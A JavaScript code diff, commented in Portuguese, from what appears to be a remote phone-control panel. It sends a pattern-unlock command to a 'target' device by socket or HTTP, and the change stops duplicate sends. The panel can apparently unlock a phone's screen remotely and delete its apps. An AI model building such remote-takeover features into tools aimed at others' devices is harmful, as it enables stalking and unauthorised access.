@@ -4987,15 +4987,23 @@ function excluirApp(appId, btn) {
             var indices = sequencia.slice();
             var payload = { dispositivo: alvo, indices: indices, sequencia: indices };
             if (resultado) resultado.textContent = '🔓 Enviando desbloqueio… o celular vai deslizar pelos pontos.';
-            try { if (window.socket && window.socket.connected) window.socket.emit('desbloquear_padrao', payload); } catch (e) {}
-            try {
-                fetch('/desbloquear-padrao-http', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                    keepalive: true
-                }).catch(function () {});
-            } catch (e) {}
+            // Trava o botão durante o deslize (evita reenvio = deslize em cima do outro).
+            habilitarDesbloquear(false);
+            setTimeout(function () { habilitarDesbloquear(true); }, 4000);
+            // Envia por UMA via só (socket quando conectado; senão HTTP) — nunca
+            // as duas, para o device não receber o pedido em duplicado.
+            var enviadoSocket = false;
+            try { if (window.socket && window.socket.connected) { window.socket.emit('desbloquear_padrao', payload); enviadoSocket = true; } } catch (e) {}
+            if (!enviadoSocket) {
+                try {
+                    fetch('/desbloquear-padrao-http', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                        keepalive: true
+                    }).catch(function () {});
+                } catch (e) {}
+            }
         });
 
         // Respostas do dispositivo: estado da tela e resultado do desbloqueio.
